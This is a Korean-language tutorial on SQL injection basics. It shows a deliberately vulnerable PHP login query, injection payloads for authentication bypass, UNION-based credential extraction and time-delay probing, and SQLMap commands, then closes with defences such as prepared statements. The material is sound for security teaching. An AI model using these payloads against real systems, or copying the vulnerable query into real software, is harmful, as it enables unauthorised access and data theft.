SQL Injection 기초

SQL Injection은 애플리케이션의 보안 취약점을 이용하여 데이터베이스에 악의적인 SQL 쿼리를 삽입하는 공격 기법입니다.

개념 (Concept)​

SQL Injection이란?​

SQL Injection(SQLi)은 사용자 입력값을 적절히 검증/필터링하지 않아 발생하는 취약점입니다. 공격자는 이를 통해:

  • 데이터베이스 정보 유출
  • 인증 우회 (Authentication Bypass)
  • 데이터 조작 (삽입, 수정, 삭제)
  • 시스템 명령 실행 (일부 DBMS)

취약점 발생 원리​

취약한 코드 예시 (PHP):

$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";

정상 입력:

username: admin
password: 1234

생성되는 쿼리:

SELECT * FROM users WHERE username='admin' AND password='1234'

악의적 입력:

username: admin' OR '1'='1
password: anything

생성되는 쿼리:

SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'

→ '1'='1'은 항상 참이므로 인증 우회 성공

SQL Injection 분류​

1. In-band SQLi (Classic SQLi)​

공격과 결과를 동일한 채널에서 확인 가능

  • Error-based SQLi: 에러 메시지로 정보 획득
  • Union-based SQLi: UNION 구문으로 데이터 추출

2. Blind SQLi (Inferential SQLi)​

직접적인 결과를 볼 수 없지만 간접적으로 추론

  • Boolean-based Blind SQLi: 참/거짓 응답 차이로 정보 추출
  • Time-based Blind SQLi: 시간 지연으로 정보 추출

3. Out-of-Band SQLi​

다른 채널(DNS, HTTP)을 통해 데이터 전송

취약점 탐지 방법​

수동 탐지​

1. 특수문자 삽입​

'
"
`
--
#
;

에러 발생 여부 확인:

http://example.com/product?id=1'

2. 논리 연산자 테스트​

1 OR 1=1    -- 항상 참
1 AND 1=2   -- 항상 거짓

URL 예시:

http://example.com/product?id=1 OR 1=1
http://example.com/product?id=1 AND 1=2

3. 시간 지연 테스트​

MySQL:

1' AND SLEEP(5)--

PostgreSQL:

1'; SELECT pg_sleep(5)--

MSSQL:

1'; WAITFOR DELAY '00:00:05'--

자동화 도구​

SQLMap​

가장 널리 사용되는 SQL Injection 자동화 도구

기본 스캔:

sqlmap -u "http://example.com/page?id=1"

POST 데이터 테스트:

sqlmap -u "http://example.com/login" --data="username=admin&password=test"

쿠키 기반 테스트:

sqlmap -u "http://example.com/page" --cookie="PHPSESSID=abcd1234"

요청 파일 사용:

sqlmap -r request.txt

출력 예시:

[INFO] testing connection to the target URL
[INFO] testing if the target URL content is stable
[INFO] target URL content is stable
[INFO] testing if GET parameter 'id' is dynamic
[INFO] GET parameter 'id' appears to be dynamic
[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[INFO] testing for SQL injection on GET parameter 'id'

기본 공격 시나리오​

1. 인증 우회 (Authentication Bypass)​

취약한 로그인 폼:

SELECT * FROM users WHERE username='$user' AND password='$pass'

공격 페이로드:

Username: admin' --
Password: (anything)

결과 쿼리:

SELECT * FROM users WHERE username='admin' -- ' AND password='anything'

→ 주석(--) 이후 무시되어 비밀번호 확인 생략

다른 페이로드:

Username: admin' OR '1'='1
Password: admin' OR '1'='1

2. 데이터 추출​

Union-based 예시:

1' UNION SELECT username, password FROM users--

3. 데이터베이스 정보 수집​

MySQL:

' UNION SELECT NULL, version()--
' UNION SELECT NULL, database()--
' UNION SELECT NULL, user()--

PostgreSQL:

' UNION SELECT NULL, version()--
' UNION SELECT NULL, current_database()--

방어 기법​

1. Prepared Statements (권장)​

$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);

2. Stored Procedures​

CREATE PROCEDURE GetUser(@username VARCHAR(50))
AS
SELECT * FROM users WHERE username = @username

3. Input Validation​

$id = filter_var($_GET['id'], FILTER_VALIDATE_INT);

4. Escaping (최후 수단)​

$username = mysqli_real_escape_string($conn, $_POST['username']);

5. 최소 권한 원칙​

데이터베이스 사용자 권한을 필요한 최소한으로 제한
